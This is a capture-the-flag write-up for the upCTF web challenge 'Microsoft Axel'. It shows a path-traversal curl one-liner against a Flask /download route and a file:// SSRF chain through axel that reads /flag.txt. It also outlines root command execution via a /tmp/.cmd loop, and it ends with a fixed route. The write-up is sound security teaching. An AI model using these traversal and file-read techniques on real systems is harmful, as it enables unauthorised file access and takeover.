# CTF Writeup — Microsoft Axel (419 pts) | upCTF

## Challenge Info

| Field | Value |
|---|---|
| Name | Microsoft Axel |
| Category | Web |
| Points | 419 |
| Authors | oxacb & castilho |
| Solves | 10 |
| Description | Upload anything to download later, which our latest download everything service. |

---

## TL;DR

**Path traversal** in the `/download` endpoint — Flask's `send_file` was called with a user-controlled filename that was never validated to stay within the allowed directory.

```bash
curl --path-as-is 'http://TARGET/download/../../flag.txt'
# → upCTF{4x3l_0d4y_w1th4_tw1st-oGP58B8H2c314f00}
```

---

## Recon

The app is a Flask-based file download service. Users submit a URL, `axel` downloads it to `FILES_DIR`, and files can be retrieved via `/download/<filename>`.

### File structure

```
app.py
readFlag.c          ← compiled to /readFlag (SUID-like, reads /flag.txt)
entrypoint.sh       ← background loop: runs /tmp/.cmd if it exists (as root!)
files/
  welcome.txt
```

### Key routes

```python
@app.post("/fetch")
def fetch():
    url = request.form.get("url", "").strip()
    ok, message = run_axel_download(url)   # runs: axel <url> in FILES_DIR

@app.get("/download/<path:filename>")
def download(filename: str):
    target = FILES_DIR / filename           # 🚨 No bounds check!
    return send_file(target, as_attachment=True)
```

---

## Vulnerability

### Path Traversal in `/download`

`Flask`'s `<path:filename>` route parameter accepts `/` characters. The code constructs the file path as:

```python
target = FILES_DIR / filename
```

`FILES_DIR` is `/app/files`. If `filename` is `../../flag.txt`, Python's `Path` division resolves this to `/flag.txt` — **outside** the intended directory — and `send_file` happily serves it.

There is **no** call to `target.resolve()`, no `target.is_relative_to(FILES_DIR)` check, nothing.

### Bonus: Root Command Execution via `entrypoint.sh`

The entrypoint runs a background loop **as root**:

```bash
(while true; do
  if [ -f /tmp/.cmd ]; then
    /bin/sh /tmp/.cmd    # Executes arbitrary commands as root!
    rm -f /tmp/.cmd
  fi
  sleep 0.5
done) &
```

Combined with `axel` being able to fetch arbitrary URLs (including `file://` URIs), an attacker could:
1. Host a malicious `.cmd` file
2. Use `/fetch` to download it to `/tmp/.cmd`
3. Wait 0.5 seconds for root execution

This was the "twist" referenced in the flag — multiple escalation paths exist.

---

## Exploit

### Step 1 — Direct path traversal (one-liner)

```bash
curl --path-as-is 'http://46.225.117.62:30002/download/../../flag.txt'
```

The `--path-as-is` flag tells curl **not** to normalize `../` sequences before sending, preserving the traversal payload.

**Response:**
```
upCTF{4x3l_0d4y_w1th4_tw1st-oGP58B8H2c314f00}
```

### Alternative: SSRF via axel + file:// URI

```bash
# Step 1: Make axel download /flag.txt into FILES_DIR
curl -X POST 'http://46.225.117.62:30002/fetch' \
  --data-urlencode 'url=file:///flag.txt'

# Step 2: Download the copied file normally
curl 'http://46.225.117.62:30002/download/flag.txt'
```

---

## Root Cause

| Layer | Issue |
|---|---|
| `/download` route | No path traversal validation on user-supplied filename |
| `axel` integration | Accepts `file://` URIs enabling local file read |
| `entrypoint.sh` | Background root shell executing `/tmp/.cmd` — full RCE if write access to `/tmp` |

---

## Fix

```python
@app.get("/download/<path:filename>")
def download(filename: str):
    target = (FILES_DIR / filename).resolve()
    # Ensure the resolved path is still inside FILES_DIR
    if not target.is_relative_to(FILES_DIR.resolve()):
        return "Forbidden", 403
    return send_file(target, as_attachment=True)
```

Also restrict `axel` to `http://` and `https://` schemes only.

---

## Flag

```
upCTF{4x3l_0d4y_w1th4_tw1st-oGP58B8H2c314f00}
```